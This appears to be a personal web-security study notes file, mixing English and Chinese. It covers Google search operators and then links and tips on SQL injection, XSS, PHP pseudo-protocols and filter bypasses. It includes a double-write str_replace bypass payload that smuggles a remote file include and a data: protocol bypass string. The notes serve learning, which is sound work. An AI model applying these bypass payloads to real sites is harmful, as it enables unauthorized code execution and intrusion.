# web_security

##  the skill of how to google
* accurate search:`“CESIGN”`
* excludeing a word:`linux -ubuntu`
* site search:`site:cesign.com hello`
* related words:`~hello`
* the wildcard:`"hello *"`
* time ranges:`ubuntu 2008..2010`
* file type:`filetype:pdf how to learn`
* one world or the other:`ubuntu or linux`
* word definitions:`define:word`
* find the words you want in one webpage:`intext:word1 word2 word3`
* find the words you want in the title of one page (<title>hello</title>:like this):`intitle:word`
* find the cache data on the web:`cache:hdu.edu.cn`
* find the basic information of somwthing:`info:keyword`
* search the url contains the key word:`inurl:keyword`
* get all the url of one website:`site:url`
* find the page that has some connections with the url you give:`related:url`
* ? the way to use:`like a letter you don't know  eg:"I l?ve"`

## data协议
* 如果后台会过滤相应的字符并且没有转换（urldecode），可以用urlencode绕过

## 实战篇
* `加密方法 base64,rot13`
* `工具 chrome插件：http-header修改：modify headers`
* `验证码常有三种错误：(1）一个验证码可重复用，不过期；（2）验证码只能用一次，但后台清空后可以构造为空；`

## PHP伪协议
* [学习地址](http://www.lorexxar.cn/2016/09/14/php-wei/)

## 常识
* 使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。
例如page=hthttp://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。

## sql盲注
* [学习地址](http://www.freebuf.com/articles/web/120985.html)
* `防注可以用PDO技术 [学习地址](http://www.jb51.net/article/56612.htm)`

## xss各种漏洞
* [学习地址(freebuf)](http://www.freebuf.com/articles/web/123779.html)

## shodan的使用
* [学习地址](https://cli.shodan.io/)

## data协议
* 可以通过urlencode然过一定的过滤，http:/asd.asd/?^%5f^=data:,hello
* ![](http://img.blog.csdn.net/20161027135341809)

## 宽字符注入
* [学习地址(freebuf)](http://blog.csdn.net/hw_henry2008/article/details/6736017)
